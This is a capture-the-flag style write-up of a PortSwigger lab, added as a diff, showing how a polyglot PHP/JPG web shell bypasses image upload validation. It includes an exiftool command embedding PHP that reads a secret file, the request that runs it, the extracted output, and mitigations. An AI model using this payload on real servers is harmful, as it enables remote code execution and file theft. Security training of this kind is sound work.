@@ -1,0 +1,55 @@
+Remote Code Execution via Polyglot Web Shell Upload
+
+Lab Difficulty: Practitioner
+Vulnerability Type: File Upload / Remote Code Execution (RCE)
+Lab Link: PortSwigger Lab
+
+Summary
+This lab demonstrates how file upload validation based on MIME type and image content analysis can be bypassed using a polyglot file. Even when the server verifies that an uploaded file is a valid image,
+it may still interpret and execute embedded server-side code if the file has a .php extension. By injecting PHP payloads into image metadata, attackers can achieve remote code execution (RCE).
+
+Objective
+Upload a polyglot PHP/JPG web shell that bypasses image content validation, use it to read the contents of /home/carlos/secret,
+and submit the secret to complete the lab.
+
+Technical Walkthrough
+1. Reconnaissance
+Logged in with provided credentials: wiener:peter
+
+Located an avatar upload function in the user profile page
+
+Observed that the server checks uploaded files to ensure they are real images and blocks non-image content
+
+2. Creating a Polyglot Payload
+Created a valid image file (input.jpg) and embedded PHP code into its metadata using ExifTool:
+
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
+This command inserts the PHP payload into the Comment field of the JPEG file and saves it with a .php extension
+
+3. Uploading the Polyglot
+Uploaded polyglot.php as the avatar
+  
+Server accepted the upload, since the image content was valid despite the .php extension
+
+4. Executing the Payload
+Located the uploaded file's access URL in Burp HTTP history:
+
+GET /files/avatars/polyglot.php
+Sent this request via Burp Repeater
+
+Located the PHP output inside the binary image response using "START" and "END" markers:
+
+START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
+Result
+Successfully extracted Carlos’s secret from the response and submitted it to solve the lab.
+
+Mitigation
+To prevent this vulnerability in production environments:
+
+Disallow execution of files in upload directories by configuring the web server (e.g., with .htaccess or server settings)
+
+Validate content and file type using server-side MIME detection, and never trust the file extension alone
+
+Strip all metadata from uploaded files to remove any embedded scripts or payloads
+
+Rename uploaded files and store them in directories outside the web root when execution is not required
